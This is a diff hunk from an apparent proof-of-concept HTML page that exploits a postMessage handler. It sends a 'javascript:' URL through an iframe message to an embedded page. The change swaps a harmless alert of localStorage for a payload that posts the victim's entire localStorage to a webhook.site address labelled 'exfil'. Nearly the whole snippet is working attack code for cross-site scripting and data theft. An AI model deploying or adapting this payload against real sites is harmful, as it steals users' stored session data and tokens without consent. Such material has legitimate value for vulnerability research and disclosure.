@@ -20,7 +20,8 @@
     <script>
         document.getElementById('sendMessageBtn').onclick = function() {
             const iframe = document.getElementById('myIframe');
-            iframe.contentWindow.postMessage({source:"sa-fe",type:"v-track-mode",data:{isVtrack:true,userURL:"JaVaScript:alert(JSON.stringify(localStorage))"}},"*")
+            // iframe.contentWindow.postMessage({source:"sa-fe",type:"v-track-mode",data:{isVtrack:true,userURL:"JaVaScript:alert(JSON.stringify(localStorage))"}},"*")
+            iframe.contentWindow.postMessage({source:"sa-fe",type:"v-track-mode",data:{isVtrack:true,userURL:"JaVaScript:fetch('https://webhook.site/d699ea0b-e69e-44af-88bf-03cd8d40bebb/exfil',{method:'POST',body:JSON.stringify(localStorage)})"}},"*")
         };
     </script>
 </body>
